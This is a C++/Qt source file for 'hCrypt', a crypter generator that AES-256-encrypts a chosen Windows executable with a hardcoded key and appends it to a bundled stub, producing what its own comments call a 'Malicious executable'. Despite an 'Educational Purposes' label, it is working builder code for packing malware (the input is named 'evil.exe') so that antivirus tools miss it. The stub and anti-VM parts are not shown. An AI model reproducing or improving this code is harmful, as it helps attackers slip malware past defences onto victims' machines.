#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <fstream>

using namespace std;

/*
#--------------------------------------------------------
#	AES Encrypted and AntiVM PE Builder (Crypter Generator)
#
#	https://www.github.com/hex4d0r/hCrypt
#
#	Coded by Hex4d0r for Educational Purposes
#--------------------------------------------------------
*/

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    MainWindow::setWindowTitle("hCrypt");
    MainWindow::setWindowIcon(QIcon(":/ico/hCrypt.png"));

    mAbout = new About(this);

    ui->output->setText("Output.exe");

}

MainWindow::~MainWindow()
{
    delete ui;
    delete[] data.rawData; // deleting char* rawData in mainwindow.h
}


/**
 * @brief MainWindow::on_f_open_clicked
 * Open file and get non encoded bytes into char* array(rawData)
 */

void MainWindow::on_f_open_clicked()
{
    QString filename = QFileDialog::getOpenFileName(this, "Open a File", QDir::currentPath(), "Executable Files (*.exe)");
    ui->file_label->setText("File: " + filename);

    if(!filename.isEmpty())
    {
    QFile sourceFile(filename);

    if(!sourceFile.open(QIODevice::ReadOnly))
    {
        ui->statusBar->showMessage("File can not be opened.");
    }

    QDataStream source(&sourceFile);

    qint64 size = sourceFile.size();
    data.rawData = new char[size];
    source.readRawData(data.rawData, size);

    this->size = size;

    sourceFile.close();
    }
}

void MainWindow::on_btn_build_clicked()
{
    if(data.rawData == nullptr)
    {
        ui->statusBar->showMessage("Open file first!", 2000);
        return;
    }
    /**
     * @brief output
     *
     * Filename of the output
     */
    string output = "Output.exe";

    if(!ui->output->text().isEmpty())
    {
        output = ui->output->text().toStdString();

        if(ui->output->text().toStdString().find(string(".exe")) >= 50)
        {
            output = ui->output->text().toStdString() + ".exe";
        }
    }

    fstream built(output, ios::binary | ios::out);

    /**
     * @brief peFile
     *
     * Open stub
     */
    QFile peFile(":/stub/stub.exe");
    peFile.open(QIODevice::ReadOnly);
    QDataStream stub(&peFile);

    /**
     * @brief size, stubData
     *
     * We open stub file, get size and create a char pointer
     * We write bytes of char pointer into output file.
     */
    qint64 size = peFile.size();
    char *stubData = new char[size];
    stub.readRawData(stubData, size);
    for(auto i = 0; i < size; i++)
    {
        built << stubData[i];
    }
    peFile.close();


    /**
     * Appending input file(evil.exe)
     * and close the file
     *
     * Malicious executable successfully created.
     */
    MainWindow::encrypt(data.rawData);
    for(auto i = 0; i < this->size; i++)
    {
        built << data.rawData[i];
    }
    built.close();

    ui->statusBar->showMessage(QString::fromStdString(output) + " successfully builded!", 1000);
}

/**
 * @brief MainWindow::encrypt
 * @param rawData
 *
 * AES-256 Bit Encryption. Block Size 128 Bit, Key 256 Bit.
 *
 */
void MainWindow::encrypt(char *rawData)
{
    //256 Bit Key
    unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

    unsigned char plaintext[BLOCK_SIZE];
    unsigned char ciphertext[BLOCK_SIZE];

    aes_ctx_t* ctx;
    virtualAES::initialize();
    ctx = virtualAES::allocatectx(key, sizeof(key));

    int count = 0;
    int index = this->size/16; //Outer loop range
    int innerCount = 0;
    int innerIndex = 16; //We encrypt&copy 16 Bytes for once.
    int dataIndex = 0; //Non resetting @rawData index for encryption
    int copyIndex = 0; //Non resetting @rawData index for copying encrypted data.

    /*
     * Our Block Size 16 Byte. Outer loop range has to be executablesize/16.
     *
     * First we store first 16 byte of our executable into @plaintext
     * We encrypt @plaintext.
     * @rawData index shouldnt be reset to 0. So @dataCount variable always increasing.
     * Thus @rawData always be like @rawData[16, 32, 64, 128 ... @executablesize]
     *
     * After encryption we copy the encrypted data into @rawData.
     * Again we use special index(@copyCount) which it never be reset to 0.
     */

    for(count; count < index; count++)
    {
        for(innerCount = 0; innerCount < innerIndex; innerCount++)
        {
            plaintext[innerCount] = rawData[dataIndex];
            dataIndex++;
        }

        virtualAES::encrypt(ctx, plaintext, ciphertext);

        for(innerCount = 0; innerCount < innerIndex; innerCount++)
        {
            rawData[copyIndex] = ciphertext[innerCount];
            copyIndex++;
        }
    }

    delete ctx;
}

void MainWindow::on_actionAbout_triggered()
{
    mAbout->show();
}
